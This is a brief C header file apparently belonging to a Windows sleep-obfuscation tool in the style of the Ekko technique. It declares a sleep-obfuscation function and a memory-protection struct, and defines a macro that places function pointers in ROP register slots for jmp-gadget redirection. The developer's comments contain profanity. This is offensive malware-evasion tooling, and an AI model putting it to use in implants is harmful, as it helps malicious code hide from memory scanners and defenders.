#pragma once
#include "SleepObfMain.h"
#include <winternl.h>


BOOL EkkoSleepObf(
	_In_ DWORD TimeOut
);

typedef struct _ProtectData {
	DWORD ProtectValue;
	DWORD RegionSize;
}ProtectData, * pProtectData;

void GetVirtualProtections(pProtectData ProtectArr);

#define OBFU_JMP_RBX 0x1
#define OBFU_JMP_RAX 0x0

//holy shit this was annoying 0xFF 0x23 = jmp [rbx] not jmp rbx so you need to give it tot he address of your function pointer
//holy fuck this broke my brain trying to debug for so long
#define SetJmpObfuscation( i, p) \
	if ( JmpBypass == OBFU_JMP_RBX ) { \
		Rop[i].Rbx = (UINT_PTR)&p;  \
	} else { \
		Rop[i].Rax = (UINT_PTR)p; \
	} \

